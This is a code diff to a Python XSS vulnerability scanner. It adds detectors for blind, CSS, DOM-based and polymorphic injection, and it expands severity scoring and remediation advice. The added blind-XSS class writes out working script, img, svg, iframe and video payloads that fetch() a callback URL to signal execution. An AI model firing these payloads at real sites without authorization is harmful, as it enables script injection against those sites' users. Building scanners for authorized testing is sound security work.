@@ -14,6 +14,7 @@ import json
 import html
 import logging
 from pathlib import Path
+import statistics
 
 logger = logging.getLogger("MoD.xss_scanner")
 if not logger.handlers:
@@ -385,6 +386,137 @@ class ContextDetector:
         
         return contexts
 
+class BlindXSSDetector:
+    MARKERS = {
+        'time': f'xss_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}',
+        'random': f'xss_{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}',
+    }
+    
+    @staticmethod
+    def generate_blind_payloads(callback_url: str) -> List[str]:
+        marker = BlindXSSDetector.MARKERS['time']
+        payloads = [
+            f'<script>fetch("{callback_url}?xss={marker}")</script>',
+            f'<img src=x onerror="fetch(\\"{callback_url}?xss={marker}\\")">',
+            f'<svg/onload="fetch(\\"{callback_url}?xss={marker}\\")">',
+            f'<details open ontoggle="fetch(\\"{callback_url}?xss={marker}\\")">',
+            f'<iframe srcdoc="<script>fetch(\\"{callback_url}?xss={marker}\\")</script>">',
+            f'<video src=x onerror="fetch(\\"{callback_url}?xss={marker}\\")">',
+        ]
+        return payloads
+    
+    @staticmethod
+    def detect_blind_xss(stored_callback_data: List[str], marker: str) -> Tuple[bool, float]:
+        if not stored_callback_data:
+            return False, 0.0
+        
+        for entry in stored_callback_data:
+            if marker in entry:
+                return True, 0.95
+        
+        return False, 0.0
+
+
+class CSSInjectionDetector:
+    CSS_PATTERNS = [
+        r'@import\s+["\'].*?["\']',
+        r'behavior:\s*url\(',
+        r'expression\s*\(',
+        r'-moz-binding:',
+        r'&lt;style&gt;',
+        r'\\003c style',
+    ]
+    
+    @staticmethod
+    def detect_css_injection(response_content: str, payload: str) -> Tuple[bool, float]:
+        confidence = 0.0
+        
+        for pattern in CSSInjectionDetector.CSS_PATTERNS:
+            if re.search(pattern, response_content, re.IGNORECASE):
+                confidence += 0.2
+            if re.search(pattern, payload, re.IGNORECASE):
+                confidence += 0.15
+        
+        if '<style' in response_content and payload in response_content:
+            confidence += 0.3
+        
+        return confidence > 0.4, min(confidence, 1.0)
+
+
+class DOMPathTracer:
+    DANGEROUS_PROPERTIES = [
+        'innerHTML', 'outerHTML', 'insertAdjacentHTML', 'append',
+        'appendChild', 'insertBefore', 'replaceChild'
+    ]
+    
+    SAFE_PROPERTIES = [
+        'textContent', 'innerText', 'value', 'textJoin'
+    ]
+    
+    @staticmethod
+    def trace_dom_sinks(javascript_code: str) -> Tuple[List[str], float]:
+        dangerous_sinks = []
+        score = 0.0
+        
+        for sink in DOMPathTracer.DANGEROUS_PROPERTIES:
+            if re.search(rf'\b{sink}\b', javascript_code):
+                dangerous_sinks.append(sink)
+                score += 0.15
+        
+        for safe_prop in DOMPathTracer.SAFE_PROPERTIES:
+            if re.search(rf'\b{safe_prop}\b', javascript_code):
+                score -= 0.1
+        
+        return dangerous_sinks, max(min(score, 1.0), 0.0)
+
+
+class ReflectionDepthAnalyzer:
+    @staticmethod
+    def analyze_reflection_depth(payload: str, response: str) -> Tuple[str, float]:
+        reflection_context = 'unknown'
+        confidence = 0.5
+        
+        if f'<script>{payload}</script>' in response:
+            reflection_context = 'unescaped_script'
+            confidence = 0.95
+        elif f'<{payload}>' in response:
+            reflection_context = 'unescaped_tag'
+            confidence = 0.92
+        elif f'on*="{payload}"' in response or f"on*='{payload}'" in response:
+            reflection_context = 'unescaped_attribute'
+            confidence = 0.90
+        elif html.escape(payload) in response:
+            reflection_context = 'html_entity_encoded'
+            confidence = 0.65
+        elif urllib.parse.quote(payload) in response:
+            reflection_context = 'url_encoded'
+            confidence = 0.70
+        elif base64.b64encode(payload.encode()).decode() in response:
+            reflection_context = 'base64_encoded'
+            confidence = 0.55
+        elif payload in response:
+            reflection_context = 'unescaped'
+            confidence = 0.80
+        
+        return reflection_context, confidence
+
+
+class PolymorphicXSSDetector:
+    @staticmethod
+    def detect_polymorphic_variants(payloads: List[str], responses: Dict[str, str]) -> Tuple[bool, List[str], float]:
+        blocked_patterns = []
+        bypass_count = 0
+        
+        for payload, response in responses.items():
+            if payload in response:
+                bypass_count += 1
+        
+        if bypass_count >= len(responses) * 0.3:
+            return True, list(responses.keys()), min(bypass_count / len(responses), 1.0)
+        
+        return False, [], 0.0
+
+
 class XSSScanner:
     def __init__(self, max_workers: int = 15):
         self.polyglot_gen = AdvancedPolyglotGenerator()
@@ -395,6 +527,11 @@ class XSSScanner:
         self.mutation_detector = MutationXSSDetector()
         self.reflection_analyzer = ReflectionAnalyzer()
         self.context_detector = ContextDetector()
+        self.blind_detector = BlindXSSDetector()
+        self.css_detector = CSSInjectionDetector()
+        self.dom_tracer = DOMPathTracer()
+        self.reflection_depth = ReflectionDepthAnalyzer()
+        self.polymorphic_detector = PolymorphicXSSDetector()
         
         self.vulnerabilities: List[XSSVulnerability] = []
         self.scan_statistics = {}
@@ -467,25 +604,51 @@ class XSSScanner:
         if not contexts:
             return None
         
-        xss_type, confidence = self._determine_xss_type(
-            payload, response, reflection, dom_risk, mutation_risk
-        )
+        reflection_context, depth_confidence = self.reflection_depth.analyze_reflection_depth(payload, response)
+        reflection['confidence'] = max(reflection['confidence'], depth_confidence)
         
-        if confidence < 0.6:
+        is_css_injection, css_confidence = self.css_detector.detect_css_injection(response, payload)
+        if is_css_injection and css_confidence > 0.5:
+            xss_type = XSSType.ATTRIBUTE
+            confidence = css_confidence
+        else:
+            xss_type, confidence = self._determine_xss_type(
+                payload, response, reflection, dom_risk, mutation_risk
+            )
+        
+        if confidence < 0.55:
             return None
+        
+        dom_sinks, sink_confidence = self.dom_tracer.trace_dom_sinks(response)
+        if dom_sinks and sink_confidence > 0.5:
+            xss_type = XSSType.DOM_BASED
+            confidence = max(confidence, sink_confidence)
         
         position = reflection['positions'][0] if reflection['positions'] else -1
         surrounding = reflection['contexts'][0] if reflection['contexts'] else ''
         
-        severity = self._calculate_severity(xss_type, confidence, dom_risk)
+        severity = self._calculate_severity(xss_type, confidence, dom_risk or sink_confidence > 0.7)
         
         bypass_used = []
         for name, func in self.waf_bypass.BYPASS_TECHNIQUES.items():
             try:
-                if func(payload) in response:
+                result = func(payload)
+                if result in response or (isinstance(result, str) and result[:50] in response[:200]):
                     bypass_used.append(name)
             except:
                 pass
+        
+        evidence_parts = [
+            f"Payload reflected at position {position}",
+            f"Context: {reflection_context}",
+        ]
+        
+        if dom_flows:
+            evidence_parts.append(f"DOM flows: {','.join(dom_flows)}")
+        if dom_sinks:
+            evidence_parts.append(f"DOM sinks: {','.join(dom_sinks)}")
+        if bypass_used:
+            evidence_parts.append(f"WAF bypass: {','.join(bypass_used)}")
         
         vuln = XSSVulnerability(
             vulnerability_type='Cross-Site Scripting',
@@ -495,11 +658,11 @@ class XSSScanner:
             payload=payload,
             context=contexts[0],
             severity=severity,
-            evidence=f"Payload reflected at position {position}, DOM flows: {','.join(dom_flows) if dom_flows else 'None'}",
+            evidence=" | ".join(evidence_parts),
             response_time=resp_time,
             payload_position=position,
             surrounding_html=surrounding,
-            confirmed=reflection['is_reflected'] and confidence > 0.85,
+            confirmed=reflection['is_reflected'] and confidence > 0.82,
             confidence_score=confidence,
             bypass_used=bypass_used,
             remediation=self._generate_remediation(contexts[0], xss_type)
@@ -511,52 +674,78 @@ class XSSScanner:
                            dom_risk: bool, mutation_risk: bool) -> Tuple[XSSType, float]:
         
         if dom_risk and any(sink in response for sink in self.dom_analyzer.SINKS):
-            return XSSType.DOM_BASED, 0.92
+            return XSSType.DOM_BASED, 0.94
         
         if mutation_risk:
-            return XSSType.MUTATION_XSS, 0.88
+            mutation_detected, mutation_score = self.mutation_detector.detect_mutation_patterns(response, payload)
+            if mutation_detected:
+                return XSSType.MUTATION_XSS, min(mutation_score + 0.1, 0.95)
+            return XSSType.MUTATION_XSS, 0.85
         
-        if re.search(r'<script[^>]*>' + re.escape(payload), response, re.IGNORECASE):
-            return XSSType.TAG, 0.95
+        script_pattern = r'<script[^>]*>\s*' + re.escape(payload)
+        if re.search(script_pattern, response, re.IGNORECASE):
+            return XSSType.TAG, 0.96
         
-        if re.search(r'on\w+\s*=\s*["\']?' + re.escape(payload), response, re.IGNORECASE):
-            return XSSType.EVENT_HANDLER, 0.93
+        event_pattern = r'on\w+\s*=\s*["\']?' + re.escape(payload)
+        if re.search(event_pattern, response, re.IGNORECASE):
+            return XSSType.EVENT_HANDLER, 0.94
         
-        if 'javascript:' in response and payload in response:
-            return XSSType.JAVASCRIPT_PROTOCOL, 0.90
+        if 'javascript:' in payload.lower() and payload in response:
+            return XSSType.JAVASCRIPT_PROTOCOL, 0.92
         
-        if '<svg' in response and payload in response:
-            return XSSType.SVG_INJECTION, 0.89
+        if '<svg' in response.lower() and payload in response:
+            return XSSType.SVG_INJECTION, 0.91
+        
+        if re.search(r'<style[^>]*>.*?' + re.escape(payload), response, re.DOTALL | re.IGNORECASE):
+            return XSSType.ATTRIBUTE, 0.89
         
         if reflection['is_reflected']:
-            return XSSType.REFLECTED, 0.85
+            if reflection['reflection_count'] > 1:
+                return XSSType.POLYGLOT, min(reflection['confidence'] + 0.15, 0.93)
+            return XSSType.REFLECTED, min(reflection['confidence'], 0.87)
         
-        return XSSType.REFLECTED, reflection['confidence']
+        return XSSType.REFLECTED, min(reflection['confidence'], 0.75)
     
     def _calculate_severity(self, xss_type: XSSType, confidence: float, dom_risk: bool) -> str:
         if xss_type == XSSType.STORED:
             return 'Critical'
         if xss_type == XSSType.DOM_BASED and dom_risk:
             return 'Critical'
-        if confidence > 0.9:
+        if xss_type in [XSSType.POLYGLOT, XSSType.MUTATION_XSS]:
+            if confidence > 0.88:
+                return 'Critical'
             return 'High'
-        if confidence > 0.75:
+        if xss_type in [XSSType.TAG, XSSType.EVENT_HANDLER]:
+            if confidence > 0.92:
+                return 'Critical'
+            return 'High'
+        if confidence > 0.92:
+            return 'Critical'
+        elif confidence > 0.88:
+            return 'High'
+        elif confidence > 0.75:
             return 'Medium'
         return 'Low'
     
     def _generate_remediation(self, context: PayloadContext, xss_type: XSSType) -> str:
         remediations = {
-            PayloadContext.HTML_BODY: "Encode all user input using HTML entity encoding before rendering. Use Content Security Policy (CSP) headers.",
-            PayloadContext.HTML_ATTRIBUTE: "Properly quote and encode all attribute values. Avoid using user input in event handlers.",
-            PayloadContext.JAVASCRIPT_STRING: "Use JSON.stringify() for embedding data in JavaScript. Never use eval() with user input.",
-            PayloadContext.JAVASCRIPT_CODE: "Implement strict Content Security Policy. Never build JavaScript code from user input.",
-            PayloadContext.SVG: "Sanitize SVG content. Restrict dangerous SVG elements and attributes.",
+            PayloadContext.HTML_BODY: "Encode all user input using HTML entity encoding before rendering. Use Content Security Policy (CSP) headers. Implement input validation with allowlists.",
+            PayloadContext.HTML_ATTRIBUTE: "Properly quote and encode all attribute values using attribute-context encoding. Avoid using user input in event handlers. Use data attributes instead.",
+            PayloadContext.JAVASCRIPT_STRING: "Use JSON.stringify() for embedding data in JavaScript. Never use eval() with user input. Implement CSP with script-src nonce.",
+            PayloadContext.JAVASCRIPT_CODE: "Implement strict Content Security Policy. Never build JavaScript code from user input. Use template literals carefully.",
+            PayloadContext.SVG: "Sanitize SVG content using whitelist approach. Restrict dangerous SVG elements (script, animate, set) and attributes (onload, href).",
+            PayloadContext.CSS_VALUE: "Validate and encode CSS values. Use CSS whitelisting. Prevent expression() and url() with user input.",
+            PayloadContext.CSS_URL: "Validate URL protocols. Use only http/https. Prevent data: and javascript: URIs.",
         }
         
-        base = remediations.get(context, "Apply context-appropriate output encoding and validation.")
+        base = remediations.get(context, "Apply context-appropriate output encoding and input validation with allowlists.")
         
         if xss_type == XSSType.DOM_BASED:
-            base += " Review DOM manipulation code for unsafe sinks."
+            base += " Review DOM manipulation code for unsafe sinks (innerHTML, eval, etc.). Use safe APIs like textContent."
+        elif xss_type == XSSType.STORED:
+            base += " Store sanitized input. Implement output encoding on retrieval. Regular security audits."
+        elif xss_type == XSSType.MUTATION_XSS:
+            base += " Sanitize HTML thoroughly. Use DOMPurify or similar library. Test with mXSS payloads."
         
         return base
     
